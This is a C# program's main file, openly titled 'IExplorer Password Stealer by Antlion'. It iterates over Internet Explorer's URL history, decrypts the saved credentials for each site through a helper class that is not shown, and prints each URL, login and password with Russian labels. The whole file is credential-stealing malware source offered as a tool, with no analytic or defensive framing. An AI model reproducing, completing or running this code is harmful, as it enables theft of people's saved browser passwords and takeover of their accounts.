using System;
using System.Collections.Generic;

namespace IETurel
{
    class Program
    {
        static void Main(string[] args)
        {
            using (var hs = new ExplorerUrlHistory())
            {
                var dl = new List<string[]>();
                Console.Title = "IExplorer Password Stealer by Antlion";
                foreach (var url in hs)
                {
                    if (IEDecrypt.DecryptIePassword(url.UrlString, dl))
                    {
                        foreach (var strArray in dl)
                        {
                            if (!String.IsNullOrEmpty(url.UrlString) && !String.IsNullOrEmpty(strArray[0]) && !String.IsNullOrEmpty(strArray[1]))
                            {
                                Console.WriteLine($"Ссылка: {url.UrlString}");
                                Console.WriteLine($"Логин: {strArray[0]}");
                                Console.WriteLine($"Пароль: {strArray[1]}");
                            }
                        }
                    }
                }
            }
            Console.ReadKey();
        }
    }
}
